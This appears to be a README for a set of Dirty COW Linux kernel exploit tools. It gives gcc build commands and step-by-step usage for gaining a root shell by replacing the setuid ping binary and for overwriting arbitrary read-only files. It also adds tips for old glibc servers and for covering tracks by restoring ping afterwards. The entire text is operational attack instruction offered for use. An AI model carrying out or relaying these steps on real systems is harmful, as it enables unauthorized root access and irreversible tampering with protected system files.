# cow_exp
cow exp file2file / default / replace ELF

**[+] cowroot**

1. gcc -o cowroot -O2 -lpthread cowroot.c
2. ./cowroot
3. reboot
4. (RE getshell)ping && id
5. Do what u want do as root
6. Rember done all your stuff and rollback PING (/tmp/bak) <<< this is REAL ping

**[+] cowroot_225**
(same like cowroot, adapte gcc GLIBC_2.2.5 for some old servers)

**[+] cowf2f**

1. gcc -o cowf2f -O2 -lpthread cowf2f.c
2. ./cowf2f [taget-file] [your-file]
3. reboot
4. NO fucking backup!!!

**[+] dirtyc0w**

1. gcc -o dirtyc0w -O2 -lpthread dirtyc0w.c
2. ./dirtyc0w [taget-file] [(Str) blablabla]
3. NO fucking backup!!!

# PS:
* add `__asm__(".symver memcpy,memcpy@GLIBC_2.2.5");` in code.c to adapte {glibc_old}. default build with 2.2.5
